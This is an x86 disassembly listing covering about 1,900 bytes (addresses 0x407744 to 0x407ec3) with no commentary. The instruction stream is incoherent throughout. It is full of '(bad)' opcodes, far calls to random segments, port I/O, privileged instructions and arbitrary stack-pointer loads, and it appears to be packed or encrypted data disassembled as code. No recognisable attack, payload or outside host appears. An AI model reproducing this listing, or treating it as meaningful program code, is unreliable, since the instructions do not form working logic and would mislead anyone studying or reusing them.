  407744:	das    
  407745:	fst    DWORD PTR [edi]
  407747:	push   0x3875bd29
  40774c:	and    DWORD PTR [ebp-0x69],esp
  40774f:	cwde   
  407750:	mov    edx,0xa03a9bab
  407755:	jmp    0xc084e121
  40775a:	sub    eax,DWORD PTR [edi-0x2713680c]
  407760:	rcr    BYTE PTR [ebx+0xa],0x68
  407764:	in     al,0xe8
  407766:	xchg   ebp,eax
  407767:	fidivr DWORD PTR [ecx-0x7da71d86]
  40776d:	mov    edx,0xab8a5df2
  407772:	mov    ds:0xba9106c0,al
  407777:	call   DWORD PTR [edx-0x35b2834d]
  40777d:	ins    BYTE PTR es:[edi],dx
  40777e:	imul   ecx,DWORD PTR [edi+0x5f],0x45
  407782:	dec    eax
  407783:	mov    esi,0x1b9c9ab
  407788:	enter  0xdf4c,0xad
  40778c:	clc    
  40778d:	sub    dh,bh
  40778f:	or     al,0xb5
  407791:	out    0x9e,al
  407793:	xchg   ebp,eax
  407794:	scas   al,BYTE PTR es:[edi]
  407795:	sub    ecx,DWORD PTR ds:[edi]
  407798:	int3   
  407799:	add    DWORD PTR [esi+0x29],esi
  40779c:	mov    esi,ecx
  40779e:	stos   DWORD PTR es:[edi],eax
  40779f:	imul   esi,DWORD PTR [edi],0x191db40d
  4077a5:	mov    ds:0xf65b9029,al
  4077aa:	scas   al,BYTE PTR es:[edi]
  4077ab:	xchg   ecx,eax
  4077ac:	and    DWORD PTR [esi],edx
  4077ae:	dec    edi
  4077af:	sbb    BYTE PTR gs:[edi-0x1f1a6fbc],ah
  4077b6:	cmp    edx,esi
  4077b8:	mov    esp,ecx
  4077ba:	jnp    0x4077e5
  4077bc:	dec    ebp
  4077bd:	pop    esp
  4077be:	mov    edx,0xeb686f3d
  4077c3:	stos   BYTE PTR es:[edi],al
  4077c4:	inc    ch
  4077c6:	push   ds
  4077c7:	jo     0x407819
  4077c9:	pop    ebx
  4077ca:	pop    ecx
  4077cb:	stc    
  4077cc:	out    dx,al
  4077cd:	cmp    BYTE PTR [ebp-0xd],ch
  4077d0:	sbb    DWORD PTR [eax+0x6],0x52
  4077d4:	push   ecx
  4077d5:	shl    BYTE PTR [eax],1
  4077d7:	lds    edx,FWORD PTR [eax-0x12610bda]
  4077dd:	adc    eax,0x12dfce7c
  4077e2:	and    BYTE PTR [eax],ch
  4077e4:	add    eax,DWORD PTR [edi-0x1e]
  4077e7:	ret    
  4077e8:	std    
  4077e9:	or     cl,BYTE PTR ds:0xbbeff695
  4077ef:	pop    ds
  4077f0:	jmp    0xc1e4:0xd64de26f
  4077f7:	adc    al,0x35
  4077f9:	shl    edi,cl
  4077fb:	xchg   ecx,eax
  4077fc:	xor    al,0x6e
  4077fe:	jmp    0x40785a
  407800:	ret    0xdd0
  407803:	loope  0x4077da
  407805:	pop    ebp
  407806:	lds    ecx,FWORD PTR [ebp+0x40]
  407809:	xchg   ecx,eax
  40780a:	adc    esi,esi
  40780c:	iret   
  40780d:	mov    ds:0xce5fc077,al
  407812:	icebp  
  407813:	or     ch,dh
  407815:	mov    eax,0x30f95199
  40781a:	pop    esi
  40781b:	pop    ecx
  40781c:	jl     0x407814
  40781e:	dec    ecx
  40781f:	enter  0x2785,0xec
  407823:	out    0x86,eax
  407825:	in     al,dx
  407826:	jp     0x407836
  407828:	pop    bx
  40782a:	cli    
  40782b:	lds    esp,FWORD PTR [eax+0x2e]
  40782e:	sti    
  40782f:	call   0xd49e2d3a
  407834:	cmp    ebx,DWORD PTR [edx+0x3d60114f]
  40783a:	lods   eax,DWORD PTR ds:[esi]
  40783b:	fiadd  WORD PTR [esi]
  40783d:	fmul   QWORD PTR [ebx+ebp*8+0x2c]
  407841:	test   BYTE PTR [edx+eiz*8],ah
  407844:	inc    esp
  407845:	scas   al,BYTE PTR es:[edi]
  407846:	cld    
  407847:	fadd   st,st(2)
  407849:	inc    eax
  40784a:	and    esi,DWORD PTR [esi]
  40784c:	add    cl,bl
  40784e:	mov    dh,0x83
  407850:	pusha  
  407851:	stos   DWORD PTR es:[edi],eax
  407852:	out    dx,al
  407853:	jns    0x407846
  407855:	xor    DWORD PTR [ecx],esp
  407857:	fs fwait
  407859:	repnz fmul st,st(3)
  40785c:	out    dx,eax
  40785d:	cmp    edx,DWORD PTR [esi-0x4]
  407860:	rcl    ebp,1
  407862:	xor    al,0xf2
  407864:	test   DWORD PTR [edi],ebp
  407866:	inc    eax
  407867:	xor    al,0x5d
  407869:	cmp    al,0x8a
  40786b:	lods   al,BYTE PTR ds:[esi]
  40786c:	dec    ebp
  40786d:	mov    esp,0x91762072
  407872:	data16 sar ch,cl
  407875:	ins    BYTE PTR es:[edi],dx
  407876:	xchg   ecx,eax
  407877:	retf   0x6a98
  40787a:	push   edx
  40787b:	jnp    0x407889
  40787d:	push   edx
  40787e:	test   BYTE PTR [edx-0x5646e229],bl
  407884:	jb     0x4078b0
  407886:	jbe    0x407895
  407888:	adc    dl,BYTE PTR [eax-0x70]
  40788b:	adc    esp,DWORD PTR [ebx-0x65c1bc8c]
  407891:	xchg   DWORD PTR [esi+0x1a],edx
  407894:	mov    al,0x81
  407896:	sahf   
  407897:	pop    esi
  407898:	xor    al,BYTE PTR [edi-0x2f]
  40789b:	pop    ss
  40789c:	out    dx,al
  40789d:	xchg   BYTE PTR [esi],cl
  40789f:	pusha  
  4078a0:	int3   
  4078a1:	adc    ebp,DWORD PTR [eax+0x38]
  4078a4:	fimul  DWORD PTR [edi]
  4078a6:	into   
  4078a7:	inc    esi
  4078a8:	mov    BYTE PTR [edx+0x494fcd86],cl
  4078ae:	cdq    
  4078af:	mov    esp,0x52402c37
  4078b4:	call   0x866f:0x9d6a8403
  4078bb:	inc    ecx
  4078bc:	std    
  4078bd:	mov    ch,0xa
  4078bf:	arpl   WORD PTR [ecx-0x49],ax
  4078c2:	(bad)  
  4078c3:	shl    BYTE PTR [ebx-0x40330511],cl
  4078c9:	loopne 0x4078e9
  4078cb:	ds sub eax,0xabac88b0
  4078d1:	daa    
  4078d2:	fbld   TBYTE PTR [edi-0x6c]
  4078d5:	call   0xabcb:0x7c97dd84
  4078dc:	les    ecx,FWORD PTR [esi]
  4078de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4078df:	jmp    0xd2f2:0xa34b696d
  4078e6:	std    
  4078e7:	fmul   DWORD PTR [edi+ebx*8+0xd3c8ec6]
  4078ef:	push   es
  4078f0:	div    dh
  4078f2:	(bad)  
  4078f3:	retf   
  4078f4:	mov    ds:0x6fb6265,eax
  4078f9:	in     al,dx
  4078fa:	mov    ecx,ds
  4078fc:	push   eax
  4078fd:	(bad)  
  4078fe:	mov    edx,0x9ed36309
  407903:	dec    eax
  407904:	push   cs
  407905:	loope  0x4078c6
  407907:	jo     0x40793b
  407909:	test   edi,0x3de14ce0
  40790f:	jg     0x4078e4
  407911:	cmp    BYTE PTR [ecx],dl
  407913:	inc    BYTE PTR [eax+eiz*2+0x25e4161d]
  40791a:	ss xchg ebx,eax
  40791c:	inc    eax
  40791d:	test   BYTE PTR [ecx+0x4d210c4c],0x9
  407924:	pop    eax
  407925:	imul   edi,DWORD PTR [esi+0x4b],0xffffffbd
  407929:	mov    ebp,0xa17332da
  40792e:	jns    0x407933
  407930:	xchg   ebx,eax
  407931:	jnp    0x4079ae
  407933:	pop    ebx
  407934:	fadd   st(1),st
  407936:	push   edi
  407937:	xchg   esp,eax
  407938:	mov    BYTE PTR [ecx+0x72],dl
  40793b:	dec    esp
  40793c:	stos   BYTE PTR es:[edi],al
  40793d:	dec    edx
  40793e:	mov    ecx,0x1ec5b89d
  407943:	call   DWORD PTR [esi-0x31]
  407946:	sbb    al,dl
  407948:	(bad)  
  407949:	cmp    al,0x8b
  40794b:	dec    ebp
  40794c:	(bad)
  40794f:	mov    edi,0x9329bb6a
  407954:	data16 mov bh,0x7e
  407957:	or     edi,DWORD PTR [ecx+0x213b1aa0]
  40795d:	xchg   ecx,eax
  40795e:	mov    bh,0xae
  407960:	xor    DWORD PTR [edx+edx*1-0x13060615],0xffffff80
  407968:	and    al,0xe8
  40796a:	in     al,dx
  40796b:	cmp    DWORD PTR [eax],esp
  40796d:	inc    edx
  40796e:	retf   
  40796f:	xor    ebp,DWORD PTR [edx+eiz*2]
  407972:	sahf   
  407973:	rcr    BYTE PTR [edi-0x22],0x97
  407977:	lods   al,BYTE PTR ds:[esi]
  407978:	es jmp 0xad22:0xcc4e83dc
  407980:	sub    eax,0xca24e47
  407985:	pop    ds
  407986:	mov    dh,0x3b
  407988:	ror    BYTE PTR [ebx],cl
  40798a:	pop    ecx
  40798b:	mov    cl,bh
  40798d:	ficomp WORD PTR [esi+0x3f]
  407990:	jp     0x40795b
  407992:	call   0xa85b:0xb5ea622
  407999:	mov    DWORD PTR [ebp-0x65],esp
  40799c:	mov    ds:0xacd27f78,eax
  4079a1:	(bad)  
  4079a2:	xor    ebx,ebx
  4079a4:	outs   dx,BYTE PTR ds:[esi]
  4079a5:	call   0x5c609e0e
  4079aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4079ab:	pop    ss
  4079ac:	xchg   edx,eax
  4079ad:	mov    edi,0x51d5eefb
  4079b2:	jne    0x407a0d
  4079b4:	mov    cl,0x69
  4079b6:	cmp    al,0xa8
  4079b8:	push   edi
  4079b9:	loope  0x407a27
  4079bb:	sub    al,0x63
  4079bd:	sti    
  4079be:	stos   DWORD PTR es:[edi],eax
  4079bf:	sbb    DWORD PTR [eax+0x3f],ebx
  4079c2:	(bad)  
  4079c3:	iret   
  4079c4:	daa    
  4079c5:	sub    al,BYTE PTR [bx+di+0x21]
  4079c9:	test   BYTE PTR ds:0xf9d1106f,al
  4079cf:	or     DWORD PTR ss:[edi-0xda76d72],0x37
  4079d7:	adc    dh,BYTE PTR [eax+ebx*4]
  4079da:	cmp    al,0x2a
  4079dc:	sub    dl,BYTE PTR [ebx+0x1f]
  4079df:	mov    ah,BYTE PTR [edi]
  4079e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4079e2:	aaa    
  4079e3:	push   ss
  4079e4:	inc    esp
  4079e5:	aad    0x73
  4079e7:	rcr    BYTE PTR [ebx-0x5ec15a85],cl
  4079ed:	adc    eax,0xc7c0841d
  4079f2:	out    dx,eax
  4079f3:	js     0x407a01
  4079f5:	xchg   edi,eax
  4079f6:	xor    eax,0xbaa66aa4
  4079fb:	imul   esp,ecx,0x8b3b2fe6
  407a01:	fstp   TBYTE PTR [ebp-0x652a31]
  407a07:	mov    ecx,0x5fb83aa3
  407a0c:	fsubr  QWORD PTR [eax+0x5e]
  407a0f:	mov    dl,0x6f
  407a11:	les    edx,FWORD PTR [ebx-0x7de1bada]
  407a17:	imul   ecx,DWORD PTR [eax+0xb],0x2c
  407a1b:	push   0xeb32c07e
  407a20:	sbb    ecx,eax
  407a22:	jns    0x407a5a
  407a24:	nop
  407a25:	xor    BYTE PTR [edi+0x31],ah
  407a28:	xchg   ebp,eax
  407a29:	clc    
  407a2a:	ret    0xa1d2
  407a2d:	cmp    DWORD PTR [edx+0x33],esi
  407a30:	fbstp  TBYTE PTR [ebx+0x69]
  407a33:	sbb    BYTE PTR [edx],bl
  407a35:	sub    al,BYTE PTR [eax]
  407a37:	pop    ebp
  407a38:	(bad)  
  407a39:	mov    ?,WORD PTR ds:0x750b0f66
  407a3f:	inc    eax
  407a40:	ds in  al,0x63
  407a43:	repz jne 0x4079f7
  407a46:	adc    DWORD PTR [edx],0xffffffeb
  407a49:	xchg   ecx,eax
  407a4a:	daa    
  407a4b:	sbb    bh,al
  407a4d:	ss xchg ebx,ebp
  407a50:	mov    dl,BYTE PTR [esi-0x4]
  407a53:	loopne 0x4079e3
  407a55:	popf   
  407a56:	add    esp,DWORD PTR es:[ecx]
  407a59:	jl     0x407abc
  407a5b:	repz mov edx,0x38dfc078
  407a61:	shr    BYTE PTR [edx],1
  407a63:	sbb    esp,DWORD PTR [ecx]
  407a65:	outs   dx,BYTE PTR ds:[esi]
  407a66:	push   edx
  407a67:	xchg   esp,eax
  407a68:	xor    ecx,esp
  407a6a:	and    eax,0x92127c8c
  407a6f:	xor    al,0x4d
  407a71:	push   eax
  407a72:	xchg   edx,eax
  407a73:	lahf   
  407a74:	push   DWORD PTR [ebx+0x6e]
  407a77:	call   0xc239:0x1d9edfda
  407a7e:	rol    ebp,0xab
  407a81:	aas    
  407a82:	int    0x69
  407a84:	mov    cs,edi
  407a86:	xchg   edi,esi
  407a88:	imul   eax,DWORD PTR [ecx],0x4b
  407a8b:	mov    edi,ebp
  407a8d:	stc    
  407a8e:	add    bl,BYTE PTR ds:0xea0746b9
  407a94:	inc    ebx
  407a95:	dec    esi
  407a96:	push   eax
  407a97:	xchg   ah,cl
  407a99:	push   edi
  407a9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a9b:	cld    
  407a9c:	or     eax,0x24248d2d
  407aa1:	je     0x407a4e
  407aa3:	shl    eax,0x8b
  407aa6:	mov    ds:0x2f471f3d,al
  407aab:	xchg   ecx,eax
  407aac:	mov    edi,0xf1321c66
  407ab1:	jg     0x407a3d
  407ab3:	sbb    al,0xfd
  407ab5:	jge    0x407adc
  407ab7:	xor    eax,0x4067dbc4
  407abc:	mov    eax,0xe636acc6
  407ac1:	dec    ebx
  407ac2:	imul   edx,DWORD PTR [edx+0x14241231],0x8d904324
  407acc:	xchg   esi,eax
  407acd:	push   cs
  407ace:	jl     0x407a70
  407ad0:	std    
  407ad1:	mov    ds:0x8f3e6c25,eax
  407ad6:	jo     0x407ad5
  407ad8:	sbb    al,0x70
  407ada:	pop    edi
  407adb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407adc:	nop
  407add:	inc    edx
  407ade:	cdq    
  407adf:	add    ch,BYTE PTR [edi-0x10]
  407ae2:	mov    dh,0xce
  407ae4:	push   ebx
  407ae5:	jnp    0x407ae0
  407ae7:	sub    esp,ecx
  407ae9:	(bad)
  407aec:	arpl   ax,bx
  407aee:	int3   
  407aef:	xor    esi,DWORD PTR [edi+esi*8]
  407af2:	stos   DWORD PTR es:[edi],eax
  407af3:	xchg   ebx,eax
  407af4:	jnp    0x407b23
  407af6:	inc    BYTE PTR [eax]
  407af8:	fist   WORD PTR [edx+edx*8-0x3]
  407afc:	cmp    DWORD PTR [edi+edx*8],esi
  407aff:	stos   BYTE PTR es:[edi],al
  407b00:	je     0x407ad4
  407b02:	xchg   edi,eax
  407b03:	lahf   
  407b04:	jl     0x407b20
  407b06:	scas   eax,DWORD PTR es:[edi]
  407b07:	mov    ch,BYTE PTR [eax+0xe843ab2]
  407b0d:	mov    cl,dh
  407b0f:	mov    bl,0x3
  407b11:	pop    eax
  407b12:	sub    BYTE PTR [ebp+0x1b296e4b],bh
  407b18:	loop   0x407ad2
  407b1a:	mov    esp,?
  407b1c:	inc    eax
  407b1d:	iret   
  407b1e:	scas   eax,DWORD PTR es:[edi]
  407b1f:	out    dx,eax
  407b20:	mov    dh,BYTE PTR [edi]
  407b22:	mov    al,0xe3
  407b24:	clc    
  407b25:	les    eax,FWORD PTR [esi+0x40]
  407b28:	lahf   
  407b29:	dec    esi
  407b2a:	sbb    BYTE PTR [edi],bh
  407b2c:	push   ebx
  407b2d:	mov    ebp,DWORD PTR [ebx+ebx*4-0x43e03625]
  407b34:	sub    eax,0x220b1f37
  407b39:	icebp  
  407b3a:	and    ah,al
  407b3c:	arpl   di,si
  407b3e:	jecxz  0x407b9b
  407b40:	into   
  407b41:	test   DWORD PTR [ecx],esi
  407b43:	sbb    eax,0x5f0133cd
  407b48:	or     bh,BYTE PTR [esi+0x56]
  407b4b:	in     eax,0x11
  407b4d:	in     eax,dx
  407b4e:	imul   esp,DWORD PTR [eax+0x43e38366],0x15
  407b55:	mov    dl,0x6
  407b57:	pushf  
  407b58:	jp     0x407ada
  407b5a:	je     0x407ba6
  407b5c:	or     DWORD PTR [eax+ecx*1+0x26],edx
  407b60:	sub    al,0x5d
  407b62:	stos   BYTE PTR es:[edi],al
  407b63:	or     al,0x59
  407b65:	cdq    
  407b66:	adc    DWORD PTR [ecx],ecx
  407b68:	(bad)  
  407b69:	in     al,dx
  407b6a:	cmp    al,0xde
  407b6c:	fcom   QWORD PTR [ebx]
  407b6e:	mov    esi,0xc19b5ddf
  407b73:	mov    bh,0xdb
  407b75:	mov    ds:0xafa7f980,al
  407b7a:	shr    BYTE PTR [eax-0x21],1
  407b7d:	sub    ah,BYTE PTR [esi+eiz*1]
  407b80:	jae    0x407b68
  407b82:	pop    ds
  407b83:	cdq    
  407b84:	mov    ch,0xb0
  407b86:	add    al,0xd9
  407b88:	mov    edx,0x3a6f02b3
  407b8d:	(bad)  
  407b8e:	sub    al,0x22
  407b90:	push   ds
  407b91:	test   al,0xac
  407b93:	(bad)  
  407b94:	inc    ecx
  407b95:	clc    
  407b96:	sub    BYTE PTR [eax],ch
  407b98:	ins    DWORD PTR es:[edi],dx
  407b99:	adc    edx,DWORD PTR [edx]
  407b9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b9c:	adc    BYTE PTR [eax+ebp*1],ah
  407b9f:	dec    edi
  407ba0:	in     al,0xbc
  407ba2:	add    al,cl
  407ba4:	lahf   
  407ba5:	pop    eax
  407ba6:	jle    0x407bcf
  407ba8:	xor    eax,DWORD PTR [eax+0x75]
  407bab:	adc    bh,BYTE PTR [ebp-0x53]
  407bae:	xchg   esi,eax
  407baf:	pop    ss
  407bb0:	int3   
  407bb1:	cli    
  407bb2:	jmp    0xa9c8042b
  407bb7:	mov    ch,0x7c
  407bb9:	popa   
  407bba:	dec    ecx
  407bbb:	in     eax,0xd1
  407bbd:	and    al,0xb
  407bbf:	gs jp  0x407c11
  407bc2:	xor    eax,edi
  407bc4:	push   edx
  407bc5:	add    BYTE PTR [eax+0x5f],ch
  407bc8:	stos   DWORD PTR es:[edi],eax
  407bc9:	push   esi
  407bca:	ror    al,0x94
  407bcd:	inc    ebp
  407bce:	out    0xa2,al
  407bd0:	lahf   
  407bd1:	ja     0x407b70
  407bd3:	mov    ds:0xaa534b68,al
  407bd8:	imul   esp,DWORD PTR [ebx+0x2],0x8fb3c59f
  407bdf:	popaw  
  407be1:	cmp    eax,0x53c9541a
  407be6:	sbb    edx,DWORD PTR [esi]
  407be8:	in     eax,dx
  407be9:	or     al,0x5d
  407beb:	(bad)  
  407bec:	pop    ds
  407bed:	jnp    0x407c0a
  407bef:	xor    al,0x83
  407bf1:	inc    esi
  407bf2:	adc    esi,edx
  407bf4:	scas   eax,DWORD PTR es:[edi]
  407bf5:	je     0x407bca
  407bf7:	pop    ecx
  407bf8:	inc    edi
  407bf9:	or     cl,al
  407bfb:	jno    0x407c62
  407bfd:	cmc    
  407bfe:	mov    ss,WORD PTR [esi-0x2c3a9a28]
  407c04:	inc    edx
  407c05:	adc    eax,0x8622f135
  407c0a:	call   0x8945:0x4ef6af10
  407c11:	xchg   esi,eax
  407c12:	das    
  407c13:	jmp    0x407ba9
  407c15:	sub    eax,0x1e87ae4a
  407c1a:	fs push es
  407c1c:	out    dx,al
  407c1d:	fisub  WORD PTR [eax-0x195b6efb]
  407c23:	imul   ebp,DWORD PTR [ebx+edi*4],0x4cbed508
  407c2a:	(bad)  
  407c2b:	rep ins DWORD PTR es:[edi],dx
  407c2d:	inc    edx
  407c2e:	cdq    
  407c2f:	jge    0x407beb
  407c31:	mov    bl,0x89
  407c33:	in     eax,0x5e
  407c35:	(bad)  
  407c36:	not    edi
  407c38:	adc    eax,0x1bb1bdbd
  407c3d:	add    eax,0x9f4dad29
  407c42:	add    al,0x5e
  407c44:	adc    eax,0x4ec17f0f
  407c49:	xchg   edi,eax
  407c4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c4b:	xchg   edi,eax
  407c4c:	ins    DWORD PTR es:[edi],dx
  407c4d:	aad    0xee
  407c4f:	sub    ebp,DWORD PTR [eax-0xb697f1c]
  407c55:	pop    eax
  407c56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c57:	push   esi
  407c58:	mov    dh,0x37
  407c5a:	mov    al,0xd9
  407c5c:	xchg   edi,eax
  407c5d:	pop    eax
  407c5e:	adc    BYTE PTR [eax-0x23],al
  407c61:	push   es
  407c62:	ret    0x37ef
  407c65:	dec    BYTE PTR [edx+0x5b874fe8]
  407c6b:	ins    DWORD PTR es:[edi],dx
  407c6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c6d:	sub    al,0x16
  407c6f:	fldenvw [ebx]
  407c72:	inc    esp
  407c73:	(bad)  [esi+0x18]
  407c76:	outs   dx,BYTE PTR ds:[esi]
  407c77:	call   0xfa16:0xdf820f6f
  407c7e:	stc    
  407c7f:	xchg   ebx,eax
  407c80:	cmc    
  407c81:	nop
  407c82:	pop    esp
  407c83:	jp     0x407c3c
  407c85:	test   DWORD PTR ss:0xff68f5b7,esp
  407c8c:	(bad)  
  407c8d:	retf   
  407c8e:	in     al,0x7
  407c90:	mov    es,WORD PTR [ebx+0x44]
  407c93:	popa   
  407c94:	pop    ss
  407c95:	lods   al,BYTE PTR ds:[esi]
  407c96:	mov    al,ds:0xf91b8321
  407c9b:	inc    esp
  407c9c:	outs   dx,BYTE PTR ds:[esi]
  407c9d:	pushf  
  407c9e:	fiadd  DWORD PTR [eax+0xf38f215]
  407ca4:	fnstenv [eax+0x5]
  407ca7:	mov    ch,0xde
  407ca9:	adc    eax,ebx
  407cab:	push   esp
  407cac:	mov    esp,DWORD PTR [esi-0xe]
  407caf:	mov    dh,ch
  407cb1:	xor    BYTE PTR [esi],cl
  407cb3:	mov    ds:0xec1a17c3,al
  407cb8:	xchg   eax,esi
  407cba:	sub    esi,eax
  407cbc:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407cbe:	sub    DWORD PTR [ebp+0x5a],ecx
  407cc1:	mov    bh,0x60
  407cc3:	dec    ecx
  407cc4:	jnp    0x407c91
  407cc6:	and    DWORD PTR [ecx-0x1e57ede0],0xffffffcd
  407ccd:	enter  0x614b,0xc1
  407cd1:	sub    BYTE PTR [edx],cl
  407cd3:	or     BYTE PTR [ebp+0x7ee9b8ee],0x1d
  407cda:	fs jge 0x407d40
  407cdd:	push   0x58aab7f5
  407ce2:	mov    esp,0x1eee0514
  407ce7:	jne    0x407d5b
  407ce9:	xchg   esi,eax
  407cea:	pop    esi
  407ceb:	add    DWORD PTR [edi-0x17],esp
  407cee:	jo     0x407d45
  407cf0:	pop    esi
  407cf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407cf2:	jno    0x407d2b
  407cf4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407cf5:	inc    eax
  407cf6:	xlat   BYTE PTR ds:[ebx]
  407cf7:	xor    BYTE PTR [esi+esi*2+0x1d9a49b1],bh
  407cfe:	inc    ebx
  407cff:	lods   al,BYTE PTR ds:[esi]
  407d00:	es jg  0x407d29
  407d03:	mov    ebp,0xcc74439a
  407d08:	add    DWORD PTR [ecx+0x14],eax
  407d0b:	lods   eax,DWORD PTR ds:[esi]
  407d0c:	bsr    edi,DWORD PTR [eax-0x1e]
  407d10:	push   es
  407d11:	rol    DWORD PTR [esi-0x26f6dc36],0x4e
  407d18:	imul   edi,DWORD PTR ds:[ecx+0x77cdad76],0xffffff82
  407d20:	bound  esp,QWORD PTR [edi-0x5df640a1]
  407d26:	out    dx,eax
  407d27:	sub    eax,0x554d05bb
  407d2c:	fsub   DWORD PTR [edx]
  407d2e:	leave  
  407d2f:	cld    
  407d30:	ret    0x7e43
  407d33:	cmp    BYTE PTR [edx-0x2266561],ah
  407d39:	jmp    0x407d46
  407d3b:	cmp    DWORD PTR ds:0x429a17e0,esi
  407d41:	(bad)  
  407d43:	clc    
  407d44:	xchg   BYTE PTR [ebx-0x52],cl
  407d47:	and    ah,ah
  407d49:	xchg   ebp,eax
  407d4a:	gs enter 0xcde9,0xdc
  407d4f:	jns    0x407da7
  407d51:	xchg   edi,eax
  407d52:	test   eax,0x9d302096
  407d57:	jl     0x407db0
  407d59:	nop
  407d5a:	xchg   esi,eax
  407d5b:	sub    BYTE PTR [ebx],0x38
  407d5e:	fadd   DWORD PTR [eax]
  407d60:	retf   
  407d61:	rcr    bh,0x71
  407d64:	popf   
  407d65:	adc    al,0x2
  407d67:	xchg   esi,eax
  407d68:	jae    0x407d38
  407d6a:	clc    
  407d6b:	leave  
  407d6c:	xor    BYTE PTR [eax],bh
  407d6e:	sbb    esi,0xffffffde
  407d71:	jg     0x407d40
  407d73:	inc    ebx
  407d74:	mov    dl,0x8
  407d76:	in     eax,0xb4
  407d78:	pop    edx
  407d79:	adc    DWORD PTR [ebp+0x75],ebp
  407d7c:	ror    eax,0xe5
  407d7f:	jo     0x407d19
  407d81:	int3   
  407d82:	fwait
  407d83:	outs   dx,BYTE PTR ds:[esi]
  407d84:	mov    esp,DWORD PTR ds:0x2c7a1ad9
  407d8a:	mov    al,ds:0x1fade567
  407d8f:	iret   
  407d90:	xchg   BYTE PTR [edx],bl
  407d92:	jbe    0x407dfd
  407d94:	xchg   DWORD PTR [edx],ebp
  407d96:	mov    bh,0x35
  407d98:	rcl    BYTE PTR [eax-0xc69408b],0x3f
  407d9f:	outs   dx,BYTE PTR ds:[esi]
  407da0:	dec    ecx
  407da1:	(bad)  
  407da2:	repnz xchg edi,eax
  407da4:	fistp  QWORD PTR [edx-0x5b7d6eb6]
  407daa:	mov    ebx,0x43429a49
  407daf:	inc    ecx
  407db0:	ret    
  407db1:	iret   
  407db2:	cmp    ah,ch
  407db4:	sub    al,0xd8
  407db6:	mov    edx,0xf4d21adc
  407dbb:	shl    DWORD PTR [ebx],cl
  407dbd:	ins    BYTE PTR es:[edi],dx
  407dbe:	push   esp
  407dbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407dc0:	hlt    
  407dc1:	ds icebp 
  407dc3:	int3   
  407dc4:	add    al,0x11
  407dc6:	rcl    DWORD PTR [ebx],0x63
  407dc9:	stos   DWORD PTR es:[edi],eax
  407dca:	sub    al,0xb7
  407dcc:	and    bh,bl
  407dce:	pop    eax
  407dcf:	cs pop ebp
  407dd1:	inc    edx
  407dd2:	rcr    DWORD PTR [edx-0x27daa158],1
  407dd8:	xor    eax,0x75540b0c
  407ddd:	mov    esp,ecx
  407ddf:	inc    ecx
  407de0:	mov    BYTE PTR [si-0x107b],al
  407de5:	dec    ecx
  407de6:	mov    WORD PTR [eax],fs
  407de8:	dec    ecx
  407de9:	das    
  407dea:	mov    al,0xd2
  407dec:	xlat   BYTE PTR ds:[ebx]
  407ded:	xchg   ebp,eax
  407dee:	jns    0x407d8b
  407df0:	ret    0xc889
  407df3:	aam    0x4c
  407df5:	imul   esp,DWORD PTR [ecx-0x51c966e6],0xaa797d09
  407dff:	mov    ecx,0x9900d0f1
  407e04:	mul    DWORD PTR [edx+edi*4+0x44]
  407e08:	sub    BYTE PTR [esi-0x43],ch
  407e0b:	sub    eax,0xfacfbd74
  407e10:	lods   al,BYTE PTR ds:[esi]
  407e11:	cdq    
  407e12:	js     0x407e68
  407e14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e15:	push   ebx
  407e16:	iret   
  407e17:	call   0x464c:0x425f2b09
  407e1e:	into   
  407e1f:	test   eax,0xb616d111
  407e24:	ins    BYTE PTR es:[edi],dx
  407e25:	stc    
  407e26:	sbb    cl,cl
  407e28:	sub    DWORD PTR [esi],0x7f
  407e2b:	mov    ch,0x56
  407e2d:	in     al,dx
  407e2e:	imul   DWORD PTR ds:0x55ff2eb0
  407e34:	or     dx,di
  407e37:	or     DWORD PTR [esi-0x25],ebx
  407e3a:	into   
  407e3b:	mov    edi,0x709642da
  407e40:	add    eax,0x4215f5fc
  407e45:	pushf  
  407e46:	ins    DWORD PTR es:[edi],dx
  407e47:	push   edx
  407e48:	call   0xe96:0xd635b613
  407e4f:	dec    esp
  407e50:	and    al,0xd4
  407e52:	and    al,0x92
  407e54:	bound  ecx,QWORD PTR [ebx-0x5f]
  407e57:	jo     0x407eae
  407e59:	inc    ebp
  407e5a:	and    al,ch
  407e5c:	or     cl,BYTE PTR [ebp-0xe0612fc]
  407e62:	add    al,0x36
  407e64:	push   0x593d8fc2
  407e69:	daa    
  407e6a:	mov    edx,0x9cdeb30f
  407e6f:	bound  esp,QWORD PTR [ecx+0x609ec8e7]
  407e75:	ins    BYTE PTR es:[edi],dx
  407e76:	imul   ecx,DWORD PTR [edi],0xcb214ca
  407e7c:	inc    ebx
  407e7d:	push   ds
  407e7e:	daa    
  407e7f:	scas   eax,DWORD PTR es:[edi]
  407e80:	je     0x407e48
  407e82:	cmp    eax,0xe267159b
  407e87:	cs adc al,0x63
  407e8a:	pop    ebp
  407e8b:	dec    esi
  407e8c:	dec    esi
  407e8d:	dec    ebx
  407e8e:	pop    eax
  407e8f:	add    eax,0x2528d98b
  407e94:	mov    eax,0x10ac39a4
  407e99:	stos   DWORD PTR es:[edi],eax
  407e9a:	and    ebp,DWORD PTR [edi-0x2b]
  407e9d:	adc    BYTE PTR [ecx],al
  407e9f:	jl     0x407e6f
  407ea1:	shr    bl,0xf1
  407ea4:	xchg   esi,eax
  407ea5:	sbb    BYTE PTR ds:0xd00909c2,al
  407eab:	cmp    cl,BYTE PTR [edx-0x15]
  407eae:	mov    ecx,0xd396146
  407eb3:	out    0x50,al
  407eb5:	mov    ds:0xac30f304,al
  407eba:	xchg   esp,eax
  407ebb:	pop    ds
  407ebc:	scas   eax,DWORD PTR es:[edi]
  407ebd:	push   edx
  407ebe:	pop    ebx
  407ebf:	loopne 0x407e4b
  407ec1:	mov    dl,0x56
  407ec3:	inc    esp
